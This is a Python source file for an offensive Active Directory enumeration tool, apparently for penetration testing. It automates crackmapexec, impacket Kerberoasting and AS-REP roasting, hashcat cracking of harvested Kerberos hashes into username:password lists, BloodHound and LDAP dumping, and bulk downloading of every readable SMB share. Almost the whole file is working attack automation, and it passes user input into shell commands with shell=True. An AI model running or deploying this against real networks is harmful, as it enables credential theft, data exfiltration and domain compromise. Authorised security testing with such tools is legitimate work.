import argparse
import os
import shutil
import sys
import subprocess
import socket
import re
import ipaddress
import urllib.request
# application class

class AppArg:
    def __init__(self, username='', domain='', password='', ntlm_hash='',usersfile='',
                 target='', wordlist='rockyou.txt', kerberos=False, ldap=False,
                 smb=False, full=False, winrm=False, bloodhound=False, crack=False,lookupsid=False,userspn=False,npusers=False,setup=False):
        self._username = username
        self._domain = domain
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target = target
        self._wordlist = wordlist
        self._usersfile = usersfile
        self._kerberos = kerberos
        self._lookupsid = lookupsid
        self._npusers = npusers
        self._userspn = userspn
        self._ldap = ldap
        self._smb = smb
        self._full = full
        self._winrm = winrm
        self._bloodhound = bloodhound
        self._crack = crack
        self._setup = setup

    @property
    def username(self):
        return self._username

    @property
    def domain(self):
        return self._domain

    @property
    def password(self):
        return self._password

    @property
    def ntlm_hash(self):
        return self._ntlm_hash

    @property
    def target(self):
        return self._target

    @property
    def wordlist(self):
        return self._wordlist

    @property
    def usersfile(self):
        return self._usersfile

    @property
    def kerberos(self):
        return self._kerberos

    @property
    def lookupsid(self):
        return self._lookupsid

    @property
    def npusers(self):
        return self._npusers

    @property
    def userspn(self):
        return self._userspn

    @property
    def ldap(self):
        return self._ldap

    @property
    def smb(self):
        return self._smb

    @property
    def full(self):
        return self._full

    @property
    def winrm(self):
        return self._winrm

    @property
    def bloodhound(self):
        return self._bloodhound

    @property
    def crack(self):
        return self._crack




def create_directories_if_not_exist(*directories):
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)



def create_files_if_not_exist(*files):
    for file_path in files:
        if not os.path.exists(file_path):
            with open(file_path, "w") as file:
                file.write("")  # Write an empty string to the file


RED="\033[1;31m"
BLUE="\033[1;34m"
RESET="\033[0m"
GREEN="\033[1;32m"
PURPLE="\033[1;35m"
ORANGE="\033[1;33m"
PINK="\033[1;35m"


# script banner
def display_banner():
	print(f"""{GREEN}
 █████╗ ██████╗        ██████╗ ██╗   ██╗ █████╗ ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
██╔══██╗██╔══██╗      ██╔═══██╗██║   ██║██╔══██╗██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
███████║██║  ██║█████╗██║   ██║██║   ██║███████║██║ █╗ ██║███████║   ██║   ██║     ███████║
██╔══██║██║  ██║╚════╝██║   ██║╚██╗ ██╔╝██╔══██║██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
██║  ██║██████╔╝      ╚██████╔╝ ╚████╔╝ ██║  ██║╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
╚═╝  ╚═╝╚═════╝        ╚═════╝   ╚═══╝  ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
        {ORANGE}|__ by - {ORANGE}theblxckcicada ({PURPLE}https://ovawatch.co.za{PURPLE}{ORANGE}) __|{GREEN}{RESET}{display_disclaimer()}""")

def display_disclaimer():
     return f"""
           {ORANGE}| {RED}Disclaimer{ORANGE} |                                                                                       |
                        | {RED}Usage of this pentest tool implies understanding and acceptance of potential risks,   {ORANGE}|
                        | {RED}and the user assumes full responsibility for their actions.                           {ORANGE}|
           {RESET}"""
# argument management
def get_parser():
    parser = argparse.ArgumentParser(description='Script description')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-d', '--domain', help='Domain name of the target machine')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-H', '--ntlm-hash', help='NTLM Hash for authentication')
    parser.add_argument('-t', '--target', help='Target host or IP address (e.g 192.168.0.1 or 192.168.0.0/24)')
    parser.add_argument('-w', '--wordlist', help='Password list')
    parser.add_argument('-us', '--usersfile', help='List of domain users')
    parser.add_argument('--kerberos', action='store_true', help='Enable kerberoasting mode')
    parser.add_argument('--lookupsid', action='store_true', help='Enable lookupsid mode')
    parser.add_argument('--npusers', action='store_true', help='Enable GetNPUsers mode')
    parser.add_argument('--userspn', action='store_true', help='Enable GetUserSPNs mode')
    parser.add_argument('--ldap', action='store_true', help='Enable LDAP mode Enumeration')
    parser.add_argument('--smb', action='store_true', help='Enable SMB mode Enumeration')
    parser.add_argument('--full', action='store_true', help='Enable full mode Enumeration')
    parser.add_argument('--winrm', action='store_true', help='Enable winrm mode Enumeration')
    parser.add_argument('--bloodhound', action='store_true', help='Enable bloodhound mode Enumeration')
    parser.add_argument('--crack', action='store_true', help='Crack Found Hashes')
    return parser

def get_args(parser):
	    return parser.parse_args()


def args_to_app_args(args):
    return AppArg(**vars(args))

# get arguments
parser = get_parser()
arguments = get_args(parser)
app_args = args_to_app_args(arguments)
flag_supplied = app_args.full or app_args.kerberos or app_args.smb or app_args.winrm or app_args.lookupsid or app_args.ldap or app_args.bloodhound or app_args.npusers or app_args.userspn
current_directory_map = {}
base_directory_map = {}
target_directory_map = {}
smb_directory_map = {}
lookupsid_directory_map = {}
kerberos_directory_map = {}
ldap_directory_map = {}
smb_shares_directory_map = {}
bloodhound_directory_map = {}

# File paths maps
get_np_users_file_map = {}
get_user_spn_file_map = {}
npusers_cracked_file_map = {}
userspn_cracked_file_map = {}
lookupsid_file_map = {}
users_file_map = {}
groups_file_map = {}
userpass_file_map = {}
smb_file_map = {}
smb_shares_file_map = {}
host_file = "/etc/hosts"

# Define directory paths
def initialize_directories(ip_addresses):
    for ip in ip_addresses:
        current_directory = os.getcwd()
        current_directory_map[ip] = current_directory

        base_directory = os.path.join(current_directory, "findings")
        base_directory_map[ip] = base_directory

        target_directory = os.path.join(base_directory, ip)
        target_directory_map[ip] = target_directory

        smb_directory = os.path.join(target_directory, "smb_results")
        smb_directory_map[ip] = smb_directory

        lookupsid_directory = os.path.join(target_directory, "lookupsid_results")
        lookupsid_directory_map[ip] = lookupsid_directory

        kerberos_directory = os.path.join(target_directory, "kerberos_results")
        kerberos_directory_map[ip] = kerberos_directory

        ldap_directory = os.path.join(target_directory, "ldap_results")
        ldap_directory_map[ip] = ldap_directory

        smb_shares_directory = os.path.join(smb_directory, "smb")
        smb_shares_directory_map[ip] = smb_shares_directory

        bloodhound_directory = os.path.join(target_directory, "bloodhound_results")
        bloodhound_directory_map[ip] = bloodhound_directory

        # Define file paths and store them in the corresponding maps
        get_np_users_file = os.path.join(kerberos_directory, "GetNPUsers_results.txt")
        get_np_users_file_map[ip] = get_np_users_file

        get_user_spn_file = os.path.join(kerberos_directory, "GetUserSPNs_results.txt")
        get_user_spn_file_map[ip] = get_user_spn_file

        npusers_cracked_file = os.path.join(kerberos_directory, "npusers_cracked_hashes.txt")
        npusers_cracked_file_map[ip] = npusers_cracked_file

        userspn_cracked_file = os.path.join(kerberos_directory, "userspn_cracked_hashes.txt")
        userspn_cracked_file_map[ip] = userspn_cracked_file

        lookupsid_file = os.path.join(lookupsid_directory, "lookupsid_file.txt")
        lookupsid_file_map[ip] = lookupsid_file

        users_file = os.path.join(lookupsid_directory, "users.txt")
        users_file_map[ip] = users_file

        groups_file = os.path.join(lookupsid_directory, "groups.txt")
        groups_file_map[ip] = groups_file

        userpass_file = os.path.join(kerberos_directory, "userpass.txt")
        userpass_file_map[ip] = userpass_file
        

        smb_file = os.path.join(smb_directory, "share_drives.txt")
        smb_file_map[ip] = smb_file

        smb_shares_file = os.path.join(smb_shares_directory, "share_names.txt")
        smb_shares_file_map[ip] = smb_shares_file

     # Create directories if they do not exist
        os.makedirs(smb_directory, exist_ok=True)
        os.makedirs(lookupsid_directory, exist_ok=True)
        os.makedirs(kerberos_directory, exist_ok=True)
        os.makedirs(ldap_directory, exist_ok=True)
        os.makedirs(smb_shares_directory, exist_ok=True)
        os.makedirs(bloodhound_directory, exist_ok=True)

         # Create files if they don't exist
        for file_path in [get_np_users_file, get_user_spn_file, npusers_cracked_file, userspn_cracked_file, lookupsid_file, users_file, smb_file, smb_shares_file]:
            if not os.path.exists(file_path):
                open(file_path, 'a').close()



def cmd_ref(alive_ip):
    # Collect table rows
    rows = []

    # Target info
    if len(alive_ip) == 1:
        rows.append(("Target IP", alive_ip[0]))
    else:
        rows.append(("Target Network", app_args.target))
        rows.append(("Live Target IP", ', '.join(alive_ip)))

    # Auth info
    if app_args.domain:
        rows.append(("Domain", app_args.domain))
    rows.append(("Username", app_args.username))
    if app_args.password:
        rows.append(("Password", app_args.password))
    if app_args.ntlm_hash:
        rows.append(("NTLM Hash", app_args.ntlm_hash))
    if app_args.crack and app_args.wordlist:
        rows.append(("Wordlist", app_args.wordlist))

    # Modes
    enabled_modes = []
    if not app_args.full:
        if app_args.kerberos: enabled_modes.append("Kerberoasting")
        if app_args.lookupsid: enabled_modes.append("Lookupsid")
        if app_args.npusers: enabled_modes.append("GetNPUsers")
        if app_args.userspn: enabled_modes.append("GetUserSPNs")
        if app_args.ldap: enabled_modes.append("LDAP")
        if app_args.smb: enabled_modes.append("SMB")
        if app_args.winrm: enabled_modes.append("WinRM")
        if app_args.bloodhound: enabled_modes.append("Bloodhound")
        if app_args.crack: enabled_modes.append("Cracking")
    else:
        enabled_modes.append("Full")

    if app_args.full or not flag_supplied:
        enabled_modes.append("Full")

    # Add modes as one row
    rows.append(("Modes Enabled", ', '.join(enabled_modes)))

    print('----------------------------------------------------')
    print(f'{BLUE}Execution Summary{RESET}')
    print('----------------------------------------------------')
    for key, value in rows:
        print(f"{key:<18}: {ORANGE}{value}{RESET}")
    print('----------------------------------------------------')


def validate_arguments():
    if not app_args.target :
        parser.print_help()
        sys.exit(1)

def setup_app(alive_ip):
    # validate incoming arguments
    initialize_directories(alive_ip)
    cmd_ref(alive_ip)


def generate_cme_cmd(username,password,hash,server,crack_type,cmd):
    message = f" crackmapexec {crack_type} {server} -u '{username}' -p '{password}' {cmd}"
    if hash :
        message = f" crackmapexec {crack_type} {server} -u '{username}' -H '{hash}' {cmd}"
    return message

def run_command(message):
    try:
        command = subprocess.Popen(
                        message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = command.stdout.read() + command.stderr.read()
        return output.decode(encoding='cp1252')
    except Exception as error:
        return error

def list_smb_shares(username, password, hash, server):
    print(f'{PURPLE}[!] Trying to enumerate SMB shares...{RESET}')
    command = generate_cme_cmd(username, password,hash, server, "smb", "--shares")
    results =  run_command(command)
    # Save to file
    if 'Pwn3d' in results:
        pattern = r"\b(\w+)\s+READ\b"
        matches = re.findall(pattern, results)
        # Remove escape sequences and extract share names from the matches
        share_names = [match for match in matches if match.upper() != "PERMISSIONS"]

        # save share names to file
        result_string = '\n'.join(share_names)
        save_to_file(smb_shares_file_map[server],result_string)
        print(f'{GREEN}[+] SMB share drive names saved to {smb_shares_file_map[server]}{RESET}')

        # save crackmap results to file
        save_to_file(smb_file_map[server],results)
        print(f'{GREEN}[+] SMB share drives list saved to {smb_file_map[server]}{RESET}')

        # Download smb files
        if len(share_names) >0:
            print(f'{ORANGE}[=] Downloading SMB share files to {smb_shares_directory_map[server]}{RESET}')
            for share_name in share_names:
                download_smb_files(username,password,hash,server,share_name)
    else:
        print(f'{RED}[-] SMB enumeration failed. Could not connect to SMB {RESET}')

def save_to_file(destination,results):
    with open(destination,'w') as file:
            file.write(results)

def cleanup(targets:list):
    for target in targets:
        remove_empty_files_and_directories(base_directory_map[target])
    print(f"{BLUE}[*] Empty directories removed. Cleanup complete.{RESET}")

def remove_empty_files_and_directories(directory):
    # First pass: Remove empty files
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            if os.path.getsize(filepath) == 0:
                os.remove(filepath)

    # Second pass: Remove empty directories (bottom-up to avoid errors)
    for root, dirs, files in os.walk(directory, topdown=False):
        for dir in dirs:
            dirpath = os.path.join(root, dir)
            if not os.listdir(dirpath):  # directory is now empty
                os.rmdir(dirpath)
    


def download_smb_files(username,password,hash,server,share_name):
    if username  and hash :
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -U '{username}' --pw-nt-hash '{hash}'"
    if username  and password :
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -U '{username}%{password}'"
    else:
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -N"

    run_command(smb_download)


def enum_smb(username,password,hash,server):
           list_smb_shares(username,password,hash,server)


def enum_winrm(username,password,hash,server):
    print(f'{PURPLE}{PURPLE}[!] Trying to connecting to WinRM...{RESET}')
    command = generate_cme_cmd(username,password,hash,server,'winrm','')
    results =  run_command(command)
    if 'Pwn3d' in results:
        print(f'{GREEN}[+] Connected to WinRM{RESET}')
    else:
        print(f'{RED}[-] WinRM connection failed.{RESET}')

def gen_impacket_access(username, password, hash, server, domain, use_dc_ip=True):
    if domain:
        if username and password:
            if use_dc_ip:
                # modern style with -dc-ip appended
                message = f"'{domain}/{username}:{password}' -dc-ip {server}"
            else:
                # legacy style with @server inside target string
                message = f"'{domain}/{username}:{password}'@{server}"
            return message

        if username and hash:
            if use_dc_ip:
                message = f"'{domain}/{username}' -hashes :{hash} -dc-ip {server}"
            else:
                message = f"'{domain}/{username}'@{server} -hashes :{hash}"
            return message

        if not password:
            if use_dc_ip:
                message = f"'{domain}/{username}' -no-pass -dc-ip {server}"
            else:
                message = f"'{domain}/{username}'@{server} -no-pass"
            return message
    else:
        if username and password:
            if use_dc_ip:
                message = f"'{username}:{password}' -dc-ip {server}"
            else:
                message = f"'{username}:{password}'@{server}"
            return message

        if username and hash:
            if use_dc_ip:
                message = f"'{username}' -hashes :{hash} -dc-ip {server}"
            else:
                message = f"'{username}'@{server} -hashes :{hash}"
            return message

        if not username or not password:
            if use_dc_ip:
                message = f"'{username}' -no-pass -dc-ip {server}"
            else:
                message = f"'{username}'@{server} -no-pass"
            return message
    return ""



def enum_lookupsid(username,password,hash,server,domain):
    print(f'{PURPLE}[!] Trying to fetch user and group SIDs identities...{RESET}')
    # Get Lookupsids
    command = f"impacket-lookupsid {gen_impacket_access(username,password,hash,server,domain,use_dc_ip=False)}"
    results = run_command(command)
    if '[-] SMB SessionError:' in results:
        print(f'{RED}[-] Failed. Could not find domain sids{RESET}')
    elif 'STATUS_ACCESS_DENIED' in results :
        print(f'{RED}[-] Failed. Access Denied!!{RESET}')
    elif 'Errno Connection error' in results :
        print(f'{RED}[-] Failed. Connection Error!!{RESET}')
    else:
        save_to_file(lookupsid_file_map[server],results)
        print(f'{GREEN}[+] Lookupsids saved to {lookupsid_file_map[server]}{RESET}')

        # Get users
        command = f"cat {lookupsid_file_map[server]} |  awk -F '[:\\\\\\\\(\\\\)]' '/SidTypeUser/ {{print $3}}'"
        results = run_command(command)
        save_to_file(users_file_map[server],results)
        print(f'{GREEN}[+] Domain Users list saved to {users_file_map[server]}{RESET}')

        # Get groups
        command = f"cat {lookupsid_file_map[server]} |  awk -F '[:\\\\\\\\(\\\\)]' '/SidTypeGroup/ {{print $3}}'"
        results = run_command(command)
        save_to_file(groups_file_map[server],results)
        print(f'{GREEN}[+] Domain Groups list saved to {groups_file_map[server]}{RESET}')

def get_NPUsers(username,password,hash,server,domain):
    print(f"{PURPLE}[!] Trying AS-REP Roasting...{RESET}")
    command = f"impacket-GetNPUsers {gen_impacket_access(username,password,hash,server,domain)} -usersfile {app_args.usersfile or users_file_map[server]} | grep '$krb5asrep' "
    results = run_command(command)
    if '$krb5asrep$23$' in results:
        save_to_file(get_np_users_file_map[server],results.split('/usr')[0])
        print(f'{GREEN}[+] Saved NPUsers hashes to {get_np_users_file_map[server]}{RESET}')
    else:
        print(f'{RED}[-] Failed. No NPUsers hashes found!!{RESET}')

def get_UserSPNs(username,password,hash,server,domain):
    print(f"{PURPLE}[!] Trying Kerberoasting,fetching user accounts with servicePrincipalName(SPN)...{RESET}")
    command = f"impacket-GetUserSPNs {gen_impacket_access(username,password,hash,server,domain)} -request  | grep '$krb5tgs' "
    results = run_command(command)
    if '$krb5tgs' in results:
        save_to_file(get_user_spn_file_map[server],results.split('/usr')[0])
        print(f'{GREEN}[+] Saved UserSPNs hashes to {get_user_spn_file_map[server]}{RESET}')
    else:
        print(f'{RED}[-] Failed. No service account hashes found!!')

def crack_hashes(server,domain):
    print(f"{PURPLE}[!] Cracking hashes using hashcat...{RESET}")
    if get_np_users_file_map[server]:
        command = f"hashcat {get_np_users_file_map[server]} {app_args.wordlist} -m 18200 --potfile-disable"
        results = run_command(command)
        if results or 'Cracked' in results:
            save_to_file(npusers_cracked_file_map[server],results)
            command = f"cat {npusers_cracked_file_map[server]} | grep '$krb5asrep' | grep -v 'Hash.Target'  | awk -F '[$:]'  '{{gsub(/@{domain.upper()}/, \"\",$4); print $4 \":\" $NF }}' >> {userpass_file_map[server]} "
            run_command(command)
            print(f'{GREEN}[+] Cracked Kerberos NPUsers hashes saved to {npusers_cracked_file_map[server]}')
        else:
            print(f'{RED}[-] No Kerberos NPUsers hashes found')

    if get_user_spn_file_map[server]:
        command = f"hashcat {get_user_spn_file_map[server]} {app_args.wordlist}  -m 13100 --potfile-disable"
        results = run_command(command)
        if results or 'Cracked' in results:
            save_to_file(userspn_cracked_file_map[server],results)
            command = f"cat {userspn_cracked_file_map[server]} | grep '$krb5tgs' | grep -v 'Hash.Target' | awk -F '[$:]' '{{print $4 \":\" $NF }}' | sed 's/^\\*//' >> {userpass_file_map[server]} "
            run_command(command)
            print(f'{GREEN}[+] Cracked Kerberos UserSPNs hashes saved to {userspn_cracked_file_map[server]}{RESET}')
        else:
            print(f'{RED}[-] No Kerberos UserSPNs hashes found{RESET}')

    # distinct the results 
    remove_duplicate_lines(userpass_file_map[server])

def remove_duplicate_lines(filename, output_file=None):
    seen = set()
    output_file = output_file or filename  # overwrite input file if no output specified

    with open(filename, 'r') as f:
        lines = f.readlines()

    unique_lines = []
    for line in lines:
        line_strip = line.strip()
        if line_strip not in seen:
            seen.add(line_strip)
            unique_lines.append(line_strip)

    with open(output_file, 'w') as f:
        for line in unique_lines:
            f.write(line + '\n')



def domain_to_dc(domain):
    components = domain.split('.')
    dc_components = ['DC=' + comp for comp in components]
    return ','.join(dc_components)

def enum_ldap(username,password,hash,server,domain):
    print(f"{PURPLE}[!] Trying to enumerate LDAP...{RESET}")
    if not domain or not username or not password:
        print(f'{RED}[-] LDAP enumeration failed. domain, username and password can not be null')
    else :
        command = f"ldapdomaindump -u '{domain}\\{username}'  -p '{password}' -dc-ip {server} -o {ldap_directory_map[server]}"
        run_command(command)
        files = os.listdir(ldap_directory_map[server])
        if len(files) == 0:
            print(f"{RED}[-] LDAP enumeration failed. Could not connect to LDAP{RESET}")
        else:
            print(f'{GREEN}[+] LDAP files saved to {ldap_directory_map[server]}{RESET}')

def move_bloodhound_files(server):
    files = os.listdir(current_directory_map[server])

    # Filter the list to only include files ending with '.json'
    json_files = [f for f in files if f.endswith('.json')]
    if len(json_files) ==0:
        print(f'{RED}[-] Could not collect Bloodhound Files{RESET}')
    # Move each JSON file to the destination directory
    for file in json_files:
        src_path = os.path.join(current_directory_map[server], file)
        dest_path = os.path.join(bloodhound_directory_map[server], file)
        shutil.move(src_path, dest_path)
    print(f'{GREEN}[+] Bloodhound saved to {bloodhound_directory_map[server]}')


def enum_bloodhound(username,password,hash,server,domain):
    print(f"{PURPLE}[!] Collecting Bloodhound Files...{RESET}")
    if username  and password :
        command = f"bloodhound-python -d {domain} -u '{username}' -p '{password}' -ns {server} -c all"
    if username  and hash :
        command = f"bloodhound-python -d {domain} -u '{username}' --hashes '{hash}' -ns {server} -c all"
    run_command(command)
    move_bloodhound_files(server)


def handle_request(username,password,hash,server,domain):
    if app_args.crack:
        if app_args.wordlist and os.path.isfile(app_args.wordlist):
            crack_hashes(server,domain)
        else:
            print(f'{RED}[-] Failed. use -w to pass in the wordlist {RESET}')
            cleanup(base_directory_map[alive_ip[0]])
            sys.exit(1)
    if app_args.full or not flag_supplied:
        enum_smb(username,password,hash,server)
        enum_winrm(username,password,hash,server)
        enum_lookupsid(username,password,hash,server,domain)
        get_NPUsers(username,password,hash,server,domain)
        get_UserSPNs(username,password,hash,server,domain)
        enum_bloodhound(username,password,hash,server,domain)
        enum_ldap(username,password,hash,server,domain)
    else:
        if app_args.kerberos:
            enum_lookupsid(username,password,hash,server,domain)
            get_NPUsers(username,password,hash,server,domain)
            get_UserSPNs(username,password,hash,server,domain)
        if app_args.smb:
            enum_smb(username,password,hash,server)

        if app_args.winrm:
            enum_winrm(username,password,hash,server)

        if app_args.lookupsid and not app_args.kerberos:
            enum_lookupsid(username,password,hash,server,domain)

        if app_args.ldap:
            enum_ldap(username,password,hash,server,domain)

        if app_args.bloodhound:
            enum_bloodhound(username,password,hash,server,domain)

        if app_args.npusers and not app_args.kerberos:
            get_NPUsers(username,password,hash,server,domain)

        if app_args.userspn and not app_args.kerberos:
            get_UserSPNs(username,password,hash,server,domain)

    if app_args.crack:
        if app_args.wordlist and os.path.isfile(app_args.wordlist):
            crack_hashes(server,domain)
        else:
            print(f'{RED}[-] No wordlist provided{RESET}')
            sys.exit(1)

def validate_ip(ip):
    try:
        res = ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def generate_ip_addresses(network_address):
    try:
        network = ipaddress.ip_network(network_address, strict=False)
        return list(network.hosts())
    except ValueError as e:
        print(f"{RED}[-]: {e}")
        return []

def read_target_ip_address()-> list:
    if '/' in app_args.target:
        print(f"{BLUE}[*] Retrieving Alive IP addresses...{RESET}")
        list = (str)(app_args.target).split('/')
        ip_address = list[0]
        isValid = validate_ip(ip_address)
        if isValid:
            ip_address =  generate_ip_addresses(app_args.target)
            message = f"netexec smb {app_args.target} |  grep -oP 'SMB\\s+\\K\\d+\\.\\d+\\.\\d+\\.\\d+' "
            data = run_command(message)
            cleaned_data = data.strip("[]'").strip()
            # Step 2: Split by newline to get individual IP addresses
            alive_ip = cleaned_data.split("\n")
            return sorted(alive_ip)
        else:
            print(f"{RED}[-] Invalid IP Address Network")
            sys.exit(1)

    return [app_args.target]


if __name__ == "__main__":
    display_banner()
    try:
        validate_arguments()
        alive_ip = read_target_ip_address()
        setup_app(alive_ip)
        print(f"{RESET}{PURPLE}--------------------{GREEN}H{ORANGE}A{BLUE}P{RED}P{GREEN}Y{ORANGE} {BLUE}H{RED}A{GREEN}U{ORANGE}N{BLUE}T{RED}I{GREEN}N{ORANGE}G{BLUE}!{RED}!{PURPLE}----------------{PURPLE}{RESET}")
        for ip in alive_ip:
            print(f"{ORANGE}---------------------------------------------------------------------------------------{RESET}")
            print(f"{BLUE}[*] Enumerating on {ip}{RESET}")
            handle_request(app_args.username,app_args.password,app_args.ntlm_hash,ip,app_args.domain)
        cleanup(alive_ip)
    except Exception as e:
        cleanup(alive_ip)
        print(f"{RED}[-] {str(e)}{RESET}")
